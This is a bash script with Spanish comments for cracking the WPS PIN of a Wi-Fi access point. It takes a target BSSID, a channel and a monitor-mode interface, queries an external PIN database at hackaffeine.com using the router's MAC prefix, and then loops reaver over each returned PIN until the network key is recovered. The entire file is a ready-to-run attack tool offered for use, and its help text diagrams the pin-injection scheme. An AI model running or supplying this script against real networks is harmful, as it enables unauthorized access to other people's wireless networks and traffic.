#!/bin/bash

###########################
# Definición de variables #
###########################
BSSID=$1
CHANN=$2
MON_IFACE=$3
PAUSA=$4
WAIT_LOCK=300
SAVE_FILE="/tmp/$BSSID"
NUM_PARAM="$#"

###########################
# Definición de funciones #
###########################
#Muestra ayuda
help() {
	echo -e "# ERROR #\n"
	if [ -f "$SAVE_FILE" ] && [ ! -z "$SAVE_FILE" ]			#Mostrar error devuelto por el servidor
		then
			cat $SAVE_FILE
	fi
	echo -e "\n- Uso:"
	echo -e "$0 <BSSID_AP> <CANAL_AP> <ITERFAZ_MODO_MONITOR> <PAUSA>"
	echo -e "\nBSSID_AP:\t\t[Requerido] La dirección MAC del router o ap."
	echo -e "CANAL_AP:\t\t[Requerido] Canal en el que emite el router o ap (1 al 13)."
	echo -e "INTERFAZ_MODO_MONITOR:\t[Requerido] La interfaz en modo monitor (mon0, wlan0mon, etc)"
	echo -e "PAUSA:\t\t\t[Opcional] Segundos de retardo entre pines. Para evitar el bloqueo del ap. Por defecto: 0"
	echo -e "\n- Ejemplo:\n$0 00:11:22:88:99:AA 6 mon0\n"
	echo -e "\n Esquema: \n"
	echo "+---------+     [Peticion mediante MAC]     +------------+"
	echo "| CLIENTE | ------------------------------> | WPS BUNKER |"
	echo "| __      |                                 | ____    _  |"
	echo "| __      | <------------------------------ | ____    _  |"
	echo "+---------+\     [Devolución de pines]      +------------+"
	echo "            \ "
	echo "             \ "
	echo "              \ "
	echo "               \ [Inyección de pines]"
	echo "                \ "
	echo "                 \          ··       ··"
	echo "                  \         ||       ||"
	echo "                   \     +---------------+"
	echo "                    \--> | AP WIFI (WPS) |"
	echo "                         +---------------+"
	echo -e "\n\n"

	exit 1
}

#Revisa que los parámetros introducidos estén bien
check() {
	if [ -z "$BSSID" ] || [ -z "$CHANN" ] || [ -z "$MON_IFACE" ] || [ "$NUM_PARAM" -lt "3" ] || [ "${#BSSID}" != "17" ] || [ "$CHANN" -gt "14" ] || [ "$CHANN" -lt "1" ] || [ -z $(netstat -i | tail -n+3 | awk '{ print $1 }' | grep "$MON_IFACE") ]
		then
			help
	fi
}

#Mostrar pines encontrados
show() {
	BSSID_API=$(echo $BSSID | awk -F: '{ print $1$2$3}')
	PINS=$(wget -q -O /tmp/$BSSID http://hackaffeine.com/wps_db/api.php?BSSID=$BSSID_API > /dev/null 2>&1)
	NUM_PINS=$(wc -l < /tmp/$BSSID)
	echo -e "\nEncontrados [ $NUM_PINS ] posibles pines"
	local CONT=1
	for i in $(cat $SAVE_FILE)
		do
			echo -e "$CONT) $i"
			let CONT=$CONT+1
	done
}

#Ataque con reaver y los pines encontrados
attack() {
	PIN_CONT=1
	for i in $(cat $SAVE_FILE)
		do
			echo -e "\nProbando PIN: [ $PIN_CONT / $NUM_PINS ]\t$i"
			PIN=$(echo $i | cut -c 1,2,3,4,5,6,7,8)					#Este filtrado es necesario debido a que reaver incluye comillas simples ('') al inicio y final de cada pin
			reaver -vv -i $MON_IFACE -c $CHANN -f -b $BSSID -g 1 -d 10 -l $WAIT_LOCK -p $PIN
			if [ "$?" == "0" ]
				then
					echo -e "\n * K E Y   F O U N D *\n"
					break
			fi
			let PIN_CONT=$PIN_CONT+1
			#Esperar los segundos definidos por $4/$PAUSA, en caso de haber establecido un número
			if [ ! -z "$PAUSA" ]
				then
					echo -e "\n ** Esperando $PAUSA segundos entre pines **\n"
					sleep $PAUSA
			fi
	done
}

########################
## PROGRAMA PRINCIPAL ##
########################
trap exit INT
check
show
attack
